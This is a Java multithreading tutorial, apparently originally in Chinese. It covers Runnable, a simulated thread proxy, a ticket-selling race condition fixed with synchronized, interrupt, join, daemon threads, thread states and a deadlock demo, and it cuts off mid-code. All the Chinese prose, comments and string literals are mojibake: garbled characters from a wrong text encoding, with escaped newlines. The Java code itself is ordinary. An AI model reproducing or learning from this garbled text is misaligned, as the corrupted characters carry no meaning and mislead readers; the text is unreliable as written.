ä¾‹å­ğŸŒ°ï¼šå®ç° Runnable æ¥å£åˆ›å»ºçº¿ç¨‹\n\n- è¯·ç¼–å†™ç¨‹åºï¼Œè¯¥ç¨‹åºå¯ä»¥æ¯éš”1ç§’åœ¨æ§åˆ¶å°è¾“å‡º\"å—·å—·, æˆ‘æ˜¯å°è€è™\" ï¼Œå½“è¾“å‡º10æ¬¡åï¼Œè‡ªåŠ¨é€€å‡ºã€‚\n\n```java\npackage com.jwt.threaduse;\n\npublic class Thread02 {\n//è¯·ç¼–å†™ç¨‹åºï¼Œè¯¥ç¨‹åºå¯ä»¥æ¯éš”1ç§’åœ¨æ§åˆ¶å°è¾“å‡º\"å—·å—·, æˆ‘æ˜¯å°è€è™\" ,å½“è¾“å‡º10æ¬¡åï¼Œè‡ªåŠ¨é€€å‡ºã€‚\n    public static void main(String[] args) {\n        Tiger tiger = new Tiger();\n      \t//tiger.start() æ²¡æœ‰è¿™ä¸ªæ–¹æ³•\n        Thread thread = new Thread(tiger);//ä»£ç†\n        thread.start();\n    }\n}\nclass Tiger implements Runnable{\n    private int count = 0;\n    @Override\n    public void run() {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"å—·å—·, æˆ‘æ˜¯å°è€è™\"+ (++count));\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"çº¿ç¨‹ç»“æŸã€‚ã€‚ã€‚\");\n    }\n}\n```\n\nå®ç° Runnable æ¥å£åˆ›å»ºçº¿ç¨‹åº•å±‚ä½¿ç”¨äº†è®¾è®¡æ¨¡å¼[ä»£ç†æ¨¡å¼] \n\nä»£ç æ¨¡æ‹Ÿå®ç° Runnable æ¥å£å¼€å‘çº¿ç¨‹çš„æœºåˆ¶\n\n```java\npackage com.jwt.threaduse;\npublic class Thread02 {\n    public static void main(String[] args) {\n        Dog dog = new Dog();\n        ThreadProxy threadProxy = new ThreadProxy(dog);\n        threadProxy.start();\n    }\n}\nclass Animal {\n\n}\nclass Dog extends Animal implements Runnable {\n    @Override\n    public void run() {\n        System.out.println(\"å°ç‹—æ±ªæ±ªå«....\");\n    }\n}\n\n//çº¿ç¨‹ä»£ç†ç±», æ¨¡æ‹Ÿäº†ä¸€ä¸ªæç®€çš„Threadç±»\nclass ThreadProxy implements Runnable {\n    private Runnable target = null;//å±æ€§ï¼Œç±»å‹æ˜¯Runnable\n    @Override\n    public void run() {\n        if (target != null) {\n            target.run();//åŠ¨æ€ç»‘å®šï¼ˆè¿è¡Œç±»å‹Tigerï¼‰\n        }\n    }\n    public ThreadProxy(Runnable target) {//æ„é€ å‡½æ•°\n        this.target = target;\n    }\n    public void start() {\n        start0();//è¿™ä¸ªæ–¹æ³•æ—¶çœŸæ­£å®ç°å¤šçº¿ç¨‹æ–¹æ³•\n    }\n    public void start0() {\n        run();\n    }\n}\n```\n\n### ä¾‹å­ğŸŒ°ï¼šå¤šçº¿ç¨‹æ‰§è¡Œ\n\n- è¯·ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œåˆ›å»ºä¸¤ä¸ªçº¿ç¨‹\n\n- ä¸€ä¸ªçº¿ç¨‹æ¯éš” 1 ç§’è¾“å‡º \"hello\" ï¼Œè¾“å‡º 10æ¬¡ï¼Œé€€å‡º\n- ä¸€ä¸ªçº¿ç¨‹æ¯éš” 1 ç§’è¾“å‡º \"hi\"ï¼Œè¾“å‡º5æ¬¡ï¼Œé€€å‡ºã€‚\n\n```java\npackage com.jwt.threaduse;\n\npublic class Thread03 {\n    // è¯·ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œåˆ›å»ºä¸¤ä¸ªçº¿ç¨‹ï¼Œ\n    // ä¸€ä¸ªçº¿ç¨‹æ¯éš”1ç§’è¾“å‡º \"hello\" ï¼Œè¾“å‡º10æ¬¡ï¼Œé€€å‡º\n    // ä¸€ä¸ªçº¿ç¨‹æ¯éš”1ç§’è¾“å‡º\"hi\"ï¼Œè¾“å‡º5æ¬¡é€€å‡ºã€‚\n    public static void main(String[] args) {\n        T1 t1 = new T1();\n        T2 t2 = new T2();\n        Thread thread1 = new Thread(t1);\n        Thread thread2 = new Thread(t2);\n        thread1.start();\n        thread2.start();\n\n    }\n}\nclass T1 implements Runnable{\n    private int count = 0 ;\n    @Override\n    public void run() {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"hello\" + (++count) + \" çº¿ç¨‹åï¼š\" + Thread.currentThread().getName());\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n\nclass T2 implements Runnable{\n    private int count = 0;\n    @Override\n    public void run() {\n        for (int i = 0; i < 5; i++) {\n            System.out.println(\"hi\"+ (++count) + \" çº¿ç¨‹åï¼š\" + Thread.currentThread().getName());\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n### ç»§æ‰¿Threadå’Œå®ç°Runnable çš„åŒºåˆ«\n\n- ä»javaçš„è®¾è®¡æ¥çœ‹ï¼Œé€šè¿‡ç»§æ‰¿ Thread æˆ–è€…å®ç° Runnable æ¥å£æ¥åˆ›å»ºçº¿ç¨‹æœ¬\n  è´¨ä¸Šæ²¡æœ‰åŒºåˆ«ï¼Œä» jdk å¸®åŠ©æ–‡æ¡£æˆ‘ä»¬å¯ä»¥çœ‹åˆ° Thread ç±»æœ¬èº«å°±å®ç°äº†\n  Runnable æ¥å£\n- å®ç° Runnable æ¥å£æ–¹å¼æ›´åŠ é€‚åˆå¤šä¸ªçº¿ç¨‹å…±äº«ä¸€ä¸ªèµ„æºçš„æƒ…å†µï¼Œå¹¶ä¸”é¿å…äº†å•ç»§æ‰¿çš„é™åˆ¶ï¼Œå»ºè®®ä½¿ç”¨Runnable\n\n### ä¾‹å­ğŸŒ°ï¼šå”®ç¥¨ç³»ç»Ÿ\n\nç¼–ç¨‹æ¨¡æ‹Ÿä¸‰ä¸ªå”®ç¥¨çª—å£å…±åŒå”®ç¥¨ 100 å¼ ï¼Œåˆ†åˆ«ä½¿ç”¨ç»§æ‰¿ Thread å’Œå®ç° Runnable æ–¹å¼ï¼Œå¹¶åˆ†ææœ‰ä»€ä¹ˆé—®é¢˜? \n\n```java\npackage com.jwt.threaduse;\n\npublic class SellTicket {\n    public static void main(String[] args) {\n        //ä½¿ç”¨Thread æ–¹å¼\n        SellTicket01 sellTicket01 = new SellTicket01();\n        SellTicket01 sellTicket02 = new SellTicket01();\n        SellTicket01 sellTicket03 = new SellTicket01();\n        sellTicket01.start();\n        sellTicket02.start();\n        sellTicket03.start();\n        \n        //å®ç°æ¥å£æ–¹å¼\n//        SellTicket02 sellTicket04 = new SellTicket02();\n//        Thread thread01 = new Thread(sellTicket04);\n//        Thread thread02 = new Thread(sellTicket04);\n//        Thread thread03 = new Thread(sellTicket04);\n//        thread01.start();\n//        thread02.start();\n//        thread03.start();\n    }\n}\n\n//ä½¿ç”¨Thread æ–¹å¼\nclass SellTicket01 extends Thread {\n    private static int ticketNum = 20;//static è®©å¤šä¸ªçº¿ç¨‹å…±äº«ticketNum\n    @Override\n    public void run() {\n        while(true){\n            System.out.println(\"çª—å£\" + Thread.currentThread().getName() + \" å”®å‡ºä¸€å¼ ç¥¨ \"+\"å‰©ä½™ç¥¨æ•°\" + (--ticketNum));\n            try {\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            if (ticketNum <= 0) {\n                System.out.println(\"çª—å£\" + Thread.currentThread().getName() + \"å”®ç¥¨ç»“æŸ...\");\n                break;\n            }\n        }\n    }\n}\n\n//å®ç°æ¥å£æ–¹å¼\nclass SellTicket02 implements Runnable{\n    private static int ticketNum = 20;//static è®©å¤šä¸ªçº¿ç¨‹å…±äº«ticketNum\n    @Override\n    public void run() {\n        while(true){\n            System.out.println(\"çª—å£\" + Thread.currentThread().getName() + \" å”®å‡ºä¸€å¼ ç¥¨ \"+\"å‰©ä½™ç¥¨æ•°\" + (--ticketNum));\n            try {\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            if (ticketNum <= 0) {\n                System.out.println(\"çª—å£\" + Thread.currentThread().getName() + \"å”®ç¥¨ç»“æŸ...\");\n                break;\n            }\n        }\n    }\n}\n```\n\né—®é¢˜æ€»ç»“ï¼šä¼šå‡ºç°å¤šä¸ªçª—å£å–åŒä¸€å¼ ç¥¨çš„æƒ…å†µï¼Œå› ä¸ºçº¿ç¨‹ 1 è¿˜æœªå‡ 1 æ—¶ï¼Œçº¿ç¨‹ 2 ä¹Ÿå¼€å§‹æ‰§è¡Œäº†ï¼Œå°±ä¼šé€ æˆçº¿ç¨‹ 1 å’Œ çº¿ç¨‹ 2 è¿”å›çš„å‰©ä½™ç¥¨æ•°ç›¸åŒã€‚ç»§ç»­çœ‹ä¸‹å»è¿™ä¸ªé—®é¢˜å°†ä¼šå¾—åˆ°è§£å†³ã€‚\n\n## çº¿ç¨‹çš„ç»ˆæ­¢\n\n- 1.å½“çº¿ç¨‹å®Œæˆä»»åŠ¡åï¼Œä¼šè‡ªåŠ¨é€€å‡ºã€‚\n- 2.è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨å˜é‡æ¥æ§åˆ¶ run æ–¹æ³•é€€å‡ºçš„æ–¹å¼åœæ­¢çº¿ç¨‹ï¼Œå³é€šçŸ¥æ–¹å¼\n\nä¾‹å­ğŸŒ°ï¼šå¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ï¼Œè¦æ±‚åœ¨ main çº¿ç¨‹ä¸­å»åœæ­¢çº¿ç¨‹ï¼Œè¯·ç¼–ç¨‹å®ç°ã€‚\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadExit {\n    public static void main(String[] args) throws InterruptedException {\n        Test test = new Test();\n        Thread thread = new Thread(test);\n        thread.start();\n        //5såé€€å‡º\n        Thread.sleep(5000);\n        test.setLoop(false);\n    }\n}\n\nclass Test implements Runnable{\n    private boolean loop = true;\n    @Override\n    public void run() {\n        while (loop) {\n            System.out.println(\"Test è¿è¡Œä¸­\");\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"çº¿ç¨‹ç»“æŸ\");\n    }\n\n    public void setLoop(boolean loop) {\n        this.loop = loop;\n    }\n}\n```\n\n## çº¿ç¨‹å¸¸ç”¨æ–¹æ³•\n\n- setName //è®¾ç½®çº¿ç¨‹åç§°ï¼Œ ä½¿ä¹‹ä¸å‚æ•°nameç›¸åŒ\n\n- getName //è¿”å›è¯¥çº¿ç¨‹çš„åç§°\n- getState //è¿”å›çº¿ç¨‹çŠ¶æ€\n\n- start //ä½¿è¯¥çº¿ç¨‹å¼€å§‹æ‰§è¡Œ; Javaè™šæ‹Ÿæœºåº•å±‚è°ƒç”¨è¯¥çº¿ç¨‹çš„start0æ–¹æ³•\n  - start åº•å±‚ä¼šåˆ›å»ºæ–°çš„çº¿ç¨‹ï¼Œ è°ƒç”¨run, runå°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–¹æ³•è°ƒç”¨ï¼Œ ä¸ä¼šå¯åŠ¨æ–°çº¿ç¨‹\n\n- run //è°ƒç”¨çº¿ç¨‹å¯¹è±¡runæ–¹æ³•;\n- setPriority //æ›´æ”¹çº¿ç¨‹çš„ä¼˜å…ˆçº§\n- getPriority //è·å–çº¿ç¨‹çš„ä¼˜å…ˆçº§\n- sleep //åœ¨æŒ‡å®šçš„æ¯«ç§’æ•°å†…è®©å½“å‰æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹ä¼‘çœ (æš‚åœæ‰§è¡Œ)\n- interrupt //ä¸­æ–­çº¿ç¨‹ï¼Œä½†å¹¶æ²¡æœ‰çœŸæ­£çš„ç»“æŸçº¿ç¨‹ã€‚æ‰€ä»¥ä¸€èˆ¬ç”¨äºä¸­æ–­æ­£åœ¨ä¼‘çœ çº¿ç¨‹\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadMethod01 {\n    public static void main(String[] args) throws InterruptedException {\n        ThreadDemo threadDemo = new ThreadDemo();\n        //è®¾ç½®çº¿ç¨‹å\n        threadDemo.setName(\"ç®€ç®€\");\n        //å¾—åˆ°çº¿ç¨‹å\n        System.out.println(\"çº¿ç¨‹å:\" + threadDemo.getName());\n        //è®¾ç½®ä¼˜å…ˆçº§\n        threadDemo.setPriority(Thread.MIN_PRIORITY);\n        //å¼€å¯çº¿ç¨‹\n        threadDemo.start();\n        //è¾“å‡ºä¼˜å…ˆçº§\n        System.out.println(\"ä¼˜å…ˆçº§ï¼š\"+threadDemo.getPriority());//å½“å‰çº¿ç¨‹ä¼˜å…ˆçº§\n        System.out.println(\"é»˜è®¤ä¼˜å…ˆçº§ï¼š\"+Thread.currentThread().getPriority());//é»˜è®¤ä¼˜å…ˆçº§\n        //æµ‹è¯•interrupt\n        for (int i = 0; i < 5; i++) {\n            Thread.sleep(1000);\n            System.out.println(\"hi\"+i);\n        }\n        //ä¸­æ–­ä¼‘çœ çš„çº¿ç¨‹ï¼Œçº¿ç¨‹è¿è¡Œ5æ¬¡ï¼Œä¼‘çœ 20ç§’ï¼Œæ‰“å°5ä¸ªhiå°±ä¸­æ–­ä¼‘çœ \n        threadDemo.interrupt();\n    }\n}\n\nclass ThreadDemo extends Thread{\n    @Override\n    public void run() {\n        while (true) {\n            for (int i = 0; i < 5; i++) {\n                System.out.println(Thread.currentThread().getName() + \"è¿è¡Œä¸­ã€‚ã€‚ã€‚\");\n            }\n            try {\n                System.out.println(\"ä¼‘çœ ä¸­ã€‚ã€‚ã€‚\");\n                Thread.sleep(20000);//ä¼‘çœ 20ç§’\n            } catch (InterruptedException e) {\n                //å½“è®¾çº¿ç¨‹æ‰§è¡Œåˆ°ä¸€ä¸ªinterrupt ä¸‡æ³•æ—¶ï¼Œå°±ä¼šcatch ä¸€ä¸ªå¼‚å¸¸ï¼Œå¯ä»¥åŠ å…¥è‡ªå·±çš„ä¸šåŠ¡ä»£ç \n                System.out.println(Thread.currentThread().getName() + \"è¢« interrupt äº†\");\n            }\n        }\n    }\n}\n```\n\n- yieldï¼šçº¿ç¨‹çš„ç¤¼è®©ã€‚è®©å‡º cpuï¼Œè®©å…¶ä»–çº¿ç¨‹æ‰§è¡Œï¼Œä½†ç¤¼è®©çš„æ—¶é—´ä¸ç¡®å®šï¼Œæ‰€ä»¥ä¹Ÿä¸ä¸€å®šç¤¼è®©æˆåŠŸ\n- joinï¼šçº¿ç¨‹çš„æ’é˜Ÿã€‚æ’é˜Ÿçš„çº¿ç¨‹ä¸€æ—¦æ’é˜ŸæˆåŠŸï¼Œåˆ™è‚¯å®šå…ˆæ‰§è¡Œå®Œæ’å…¥çš„çº¿ç¨‹æ‰€æœ‰çš„ä»»åŠ¡\n\nä¾‹å­ğŸŒ°ï¼š \n\n- ä¸»çº¿ç¨‹åˆ›å»ºä¸€ä¸ªå­çº¿ç¨‹ï¼Œæ¯éš” 1 ç§’è¾“å‡º helloï¼Œè¾“å‡º 10 æ¬¡ï¼Œ\n- ä¸»çº¿ç¨‹æ¯éš” 1 ç§’ï¼Œè¾“å‡º hiï¼Œè¾“å‡º 10 æ¬¡\n- ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡Œï¼Œå½“ä¸»çº¿ç¨‹è¾“å‡º 5 æ¬¡åï¼Œå°±è®©å­çº¿ç¨‹è¿è¡Œå®Œæ¯•ï¼Œä¸»çº¿ç¨‹å†ç»§ç»­ã€‚\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadMethod02 {\n    public static void main(String[] args) throws InterruptedException {\n        T t = new T();\n        t.start();\n\n        for (int i = 0; i < 10; i++) {\n            Thread.sleep(1000);\n            System.out.println(\"ä¸»çº¿ç¨‹ï¼šhi\"+i);\n            if (i==5){\n                System.out.println(\"ä¸»çº¿ç¨‹è®©å­çº¿ç¨‹å…ˆè¿è¡Œ\");\n//                Thread.yield();ä¸ä¸€å®šèƒ½è®©æˆåŠŸ\n                t.join();\n                System.out.println(\"å­çº¿ç¨‹è¿è¡Œå®Œæ¯•ï¼Œä¸»çº¿ç¨‹æ¥ç€è¿è¡Œ\");\n            }\n        }\n    }\n}\nclass T extends Thread{\n    @Override\n    public void run() {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"å­çº¿ç¨‹ï¼šhello\"+i);\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n\n    }\n}\n```\n\n## å®ˆæŠ¤çº¿ç¨‹\n\n- ç”¨æˆ·çº¿ç¨‹ï¼šä¹Ÿå«å·¥ä½œçº¿ç¨‹ï¼Œå½“çº¿ç¨‹çš„ä»»åŠ¡æ‰§è¡Œå®Œæˆ–é€šçŸ¥æ–¹å¼ç»“æŸ\n- å®ˆæŠ¤çº¿ç¨‹ï¼šä¸€èˆ¬æ˜¯ä¸ºå·¥ä½œçº¿ç¨‹æœåŠ¡çš„ï¼Œå½“æ‰€æœ‰çš„ç”¨æˆ·çº¿ç¨‹ç»“æŸï¼Œå®ˆæŠ¤çº¿ç¨‹è‡ªåŠ¨ç»“æŸã€‚å¸¸è§çš„å®ˆæŠ¤çº¿ç¨‹ï¼šåƒåœ¾å›æ”¶æœºåˆ¶\n\nä¾‹å­ğŸŒ°ï¼šä¸€ä¸ªä¸»çº¿ç¨‹ï¼Œä¸€ä¸ªå­çº¿ç¨‹ï¼Œå°†å­çº¿ç¨‹è®¾ç½®æˆå®ˆæŠ¤çº¿ç¨‹ï¼Œä¸€æ—¦ä¸»çº¿ç¨‹ç»“æŸï¼Œå®ˆæŠ¤çº¿ç¨‹è‡ªåŠ¨ç»“æŸã€‚\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadMethod03 {\n    public static void main(String[] args) throws InterruptedException {\n        MyDaemonThread myt = new MyDaemonThread();\n        myt.setDaemon(true);//è®¾ç½®å®ˆæŠ¤çº¿ç¨‹\n        myt.start();\n        for (int i = 0; i < 5; i++) {\n            System.out.println(\"å°ç®€è¾›è‹¦å†™ä»£ç ã€‚ã€‚ã€‚\");\n            Thread.sleep(1000);\n        }\n    }\n\n}\n\nclass MyDaemonThread extends Thread{\n    @Override\n    public void run() {\n        for (;;){//æ— é™å¾ªç¯\n            System.out.println(\"å°æ˜å’Œå°çº¢å¼€å¿ƒèŠå¤©ã€‚ã€‚ã€‚\");\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n## çº¿ç¨‹çš„çŠ¶æ€\n\n### å…­ç§çº¿ç¨‹çŠ¶æ€\n\n- NEW  æ–°å»º\n  å°šæœªå¯åŠ¨çš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n- RUNNABLE è¿è¡Œ\n  åœ¨Javaè™›æ‹Ÿæœºä¸­æ‰§è¡Œçš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n- BLOCKED é˜»å¡\n  è¢«é˜»å¡ç­‰å¾…ç›‘è§†å™¨é”å®šçš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n- WAITING ç­‰å¾…\n  æ­£åœ¨ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œç‰¹å®šåŠ¨ä½œçš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n- TIMED WAITING è¶…æ—¶ç­‰å¾…\n  æ­£åœ¨ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡ŒåŠ¨ä½œè¾¾åˆ°æŒ‡å®šç­‰å¾…æ—¶é—´çš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n- TERMINATED ç»ˆæ­¢\n  å·²é€€å‡ºçš„çº¿ç¨‹å¤„äºæ­¤çŠ¶æ€ã€‚\n\n### çº¿ç¨‹çŠ¶æ€è½¬æ¢å›¾\n\n![](https://img.jwt1399.top/img/image-20220309193750894.png)\n\n### ç¨‹åºæŸ¥çœ‹çº¿ç¨‹çŠ¶æ€\n\n```java\npackage com.jwt.threaduse;\n\npublic class ThreadState_ {\n    public static void main(String[] args) throws InterruptedException {\n        Td t = new Td();\n        System.out.println(t.getName() + \" çŠ¶æ€\" + t.getState());\n        t.start();\n        while (Thread.State.TERMINATED != t.getState()) {\n            System.out.println(t.getName() + \" çŠ¶æ€\" + t.getState());\n            Thread.sleep(500);\n        }\n        System.out.println(t.getName() + \" çŠ¶æ€\" + t.getState());\n    }\n}\nclass Td extends Thread {\n    @Override\n    public void run() {\n            for (int i = 0; i < 3; i++) {\n                System.out.println(\"hi \" + i);\n                try {\n                    Thread.sleep(1000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n    }\n}\n\n```\n\n## çº¿ç¨‹çš„åŒæ­¥\n\n### çº¿ç¨‹åŒæ­¥æœºåˆ¶\n\n- 1.åœ¨å¤šçº¿ç¨‹ç¼–ç¨‹ï¼Œä¸€äº›æ•æ„Ÿæ•°æ®ä¸å…è®¸è¢«å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®ï¼Œæ­¤æ—¶å°±ä½¿ç”¨åŒæ­¥è®¿é—®æŠ€æœ¯ï¼Œä¿è¯æ•°æ®åœ¨ä»»ä½•åŒä¸€æ—¶åˆ»ï¼Œæœ€å¤šæœ‰ä¸€ä¸ªçº¿ç¨‹è®¿é—®ï¼Œä»¥ä¿è¯æ•°æ®çš„å®Œæ•´æ€§ã€‚\n- 2.ä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼šçº¿ç¨‹åŒæ­¥ï¼Œå³å½“æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨å¯¹å†…å­˜è¿›è¡Œæ“ä½œæ—¶ï¼Œå…¶ä»–çº¿ç¨‹éƒ½ä¸å¯ä»¥å¯¹è¿™ä¸ªå†…å­˜åœ°å€è¿›è¡Œæ“ä½œï¼Œç›´åˆ°è¯¥çº¿ç¨‹å®Œæˆæ“ä½œï¼Œå…¶ä»–çº¿ç¨‹æ‰èƒ½å¯¹è¯¥å†…å­˜åœ°å€è¿›è¡Œæ“ä½œã€‚\n\n### åŒæ­¥æ–¹æ³•-Synchronized\n\n- 1.åŒæ­¥ä»£ç å—\n\n```java\nsynchronized (å¯¹è±¡) {//å¾—åˆ°å¯¹è±¡çš„é”ï¼Œæ‰èƒ½æ“ä½œåŒæ­¥ä»£ç \n\t//éœ€è¦è¢«åŒæ­¥ä»£ç ;\n}\n```\n\n- 2.åŒæ­¥æ–¹æ³•\n\n```java\npublic synchronized void m (String name){\n  //éœ€è¦è¢«åŒæ­¥çš„ä»£ç \n}\n```\n\n## äº’æ–¥é”\n\n- 1.Javaè¯­è¨€ä¸­ï¼Œå¼•å…¥äº†å¯¹è±¡äº’æ–¥é”çš„æ¦‚å¿µï¼Œæ¥ä¿è¯å…±äº«æ•°æ®æ“ä½œçš„å®Œæ•´æ€§ã€‚\n- 2.æ¯ä¸ªå¯¹è±¡éƒ½å¯¹åº”äºä¸€ä¸ªå¯ç§°ä¸º\"äº’æ–¥é”\"çš„æ ‡è®°ï¼Œè¿™ä¸ªæ ‡è®°ç”¨æ¥ä¿è¯åœ¨ä»»ä¸€ æ—¶åˆ»ï¼Œåªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹è®¿é—®è¯¥å¯¹è±¡ã€‚\n- 3.å…³é”®å­— synchronized æ¥ä¸å¯¹è±¡çš„äº’æ–¥é”è”ç³»ã€‚å½“æŸä¸ªå¯¹è±¡ç”¨ synchronized ä¿®é¥°æ—¶ï¼Œè¡¨æ˜è¯¥å¯¹è±¡åœ¨ä»»ä¸€æ—¶åˆ»åªèƒ½ç”±ä¸€ä¸ªçº¿ç¨‹è®¿é—®ã€‚\n- 4.åŒæ­¥çš„å±€é™æ€§:å¯¼è‡´ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡é™ä½\n- 5.åŒæ­¥æ–¹æ³•(éé™æ€çš„)çš„é”å¯ä»¥æ˜¯ thisï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–å¯¹è±¡(è¦æ±‚æ˜¯åŒä¸€ä¸ªå¯¹è±¡)\n- 6.åŒæ­¥æ–¹æ³•(é™æ€çš„)çš„é”ä¸ºå½“å‰ç±»æœ¬èº«ã€‚\n\n**ä½¿ç”¨äº’æ–¥é”æ¥è§£å†³å”®ç¥¨é—®é¢˜**\n\nå®ç°çš„æ­¥éª¤:\n\n- éœ€è¦å…ˆåˆ†æä¸Šé”çš„ä»£ç \n- é€‰æ‹©åŒæ­¥ä»£ç å—æˆ–åŒæ­¥æ–¹æ³•\n- è¦æ±‚å¤šä¸ªçº¿ç¨‹çš„é”å¯¹è±¡ä¸ºåŒä¸€ä¸ªå³å¯!\n\n**æ–¹æ³•1ï¼šä»£ç å—åŠ é”**\n\n```java\npackage com.jwt.threaduse;\n\npublic class SellTicket {\n    public static void main(String[] args) {\n\n        //å®ç°æ¥å£æ–¹å¼\n        SellTicket02 sellTicket04 = new SellTicket02();\n        Thread thread01 = new Thread(sellTicket04);\n        Thread thread02 = new Thread(sellTicket04);\n        Thread thread03 = new Thread(sellTicket04);\n        thread01.start();\n        thread02.start();\n        thread03.start();\n    }\n}\n\n//å®ç°æ¥å£æ–¹å¼\nclass SellTicket02 implements Runnable{\n    private  int ticketNum = 20;//static è®©å¤šä¸ªçº¿ç¨‹å…±äº«ticketNum\n    private boolean loop = true;//æ§åˆ¶run æ–¹æ³•å˜é‡\n    @Override\n    public void run() {\n        while(loop){\n            synchronized (this) {\n                if (ticketNum <= 0) {\n                    System.out.println(\"çª—å£\" + Thread.currentThread().getName() + \"å”®ç¥¨ç»“æŸ...\");\n                    loop =false;\n                    break;\n                }\n                System.out.println(\"çª—å£\" + Thread.currentThread().getName() + \" å”®å‡ºä¸€å¼ ç¥¨ \"+\"å‰©ä½™ç¥¨æ•°\" + (--ticketNum));\n                try {\n                    Thread.sleep(1000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n\n            }\n        }\n    }\n}\n```\n\n**æ–¹æ³•2ï¼šæ–¹æ³•åŠ é”**\n\n```java\npackage com.jwt.threaduse;\n\npublic class SellTicket {\n    public static void main(String[] args) {\n        //å®ç°æ¥å£æ–¹å¼\n        SellTicket02 sellTicket04 = new SellTicket02();\n        Thread thread01 = new Thread(sellTicket04);\n        Thread thread02 = new Thread(sellTicket04);\n        Thread thread03 = new Thread(sellTicket04);\n        thread01.start();\n        thread02.start();\n        thread03.start();\n    }\n}\n\n\n//å®ç°æ¥å£æ–¹å¼\nclass SellTicket02 implements Runnable{\n    private static int ticketNum = 20;//static è®©å¤šä¸ªçº¿ç¨‹å…±äº«ticketNum\n    private boolean loop = true;//æ§åˆ¶run æ–¹æ³•å˜é‡\n    public synchronized void sell(){\n                if (ticketNum <= 0) {\n                    System.out.println(\"çª—å£\" + Thread.currentThread().getName() + \"å”®ç¥¨ç»“æŸ...\");\n                    loop =false;\n                    return;\n                }\n                System.out.println(\"çª—å£\" + Thread.currentThread().getName() + \" å”®å‡ºä¸€å¼ ç¥¨ \"+\"å‰©ä½™ç¥¨æ•°\" + (--ticketNum));\n                try {\n                    Thread.sleep(50);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n    }\n    @Override\n    public void run() {\n        while(loop){\n            sell();\n            }\n        }\n}\n```\n\næ³¨æ„ï¼š\n\n- 1.åŒæ­¥æ–¹æ³•å¦‚æœæ²¡æœ‰ä½¿ç”¨ static ä¿®é¥°ï¼šé»˜è®¤é”å¯¹è±¡ä¸ºthis\n- 2.å¦‚æœæ–¹æ³•ä½¿ç”¨ static ä¿®é¥°ï¼Œé»˜è®¤é”å¯¹è±¡ï¼šå½“å‰ç±».class\n\n## çº¿ç¨‹çš„æ­»é”\n\nå¤šä¸ªçº¿ç¨‹éƒ½å ç”¨äº†å¯¹æ–¹çš„é”èµ„æºï¼Œä½†ä¸è‚¯ç›¸è®©ï¼Œå¯¼è‡´äº†æ­»é”ï¼Œåœ¨ç¼–ç¨‹æ˜¯ä¸€å®šè¦é¿å…æ­»é”çš„å‘ç”Ÿã€‚\n\nå¦ˆå¦ˆ:ä½ å…ˆå®Œæˆä½œä¸šï¼Œæ‰è®©ä½ ç©æ‰‹æœº\nå°æ˜:ä½ å…ˆè®©æˆ‘ç©æ‰‹æœºï¼Œæˆ‘æ‰å®Œæˆä½œä¸š\n\nä¾‹å­ğŸŒ°ï¼š\n\n- A çº¿ç¨‹å…ˆæŒæœ‰ o1 å¯¹è±¡ï¼Œæ‰å¯ä»¥æŒæœ‰ o2 å¯¹è±¡\n- B çº¿ç¨‹å…ˆæŒæœ‰ o2 å¯¹è±¡ï¼Œæ‰å¯ä»¥æŒæœ‰ o1 å¯¹è±¡\n\n```java\npackage com.jwt.threaduse;\n\npublic class DeadLock_ {\n    public static void main(String[] args) {\n        //æ¨¡æ‹Ÿæ­»é”ç°è±¡\n        DeadLockDemo A = new DeadLockDemo(true);\n        A.setName(\"A çº¿ç¨‹\");\n        DeadLockDemo B = new DeadLockDemo(false);\n        B.setName(\"B çº¿ç¨‹\");\n        A.start();\n        B.start();\n    }\n}\n\nclass DeadLockDemo extends Thread {\n    static Object o1 = new Object();// ä¿è¯å¤šçº¿ç¨‹ï¼Œå…±äº«ä¸€ä¸ªå¯¹è±¡,è¿™é‡Œä½¿ç”¨static\n    static Object o2 = new Object();\n    boolean flag;\n\n    public DeadLockDemo(boolean flag) {//æ„é€ å™¨\n        this.flag = 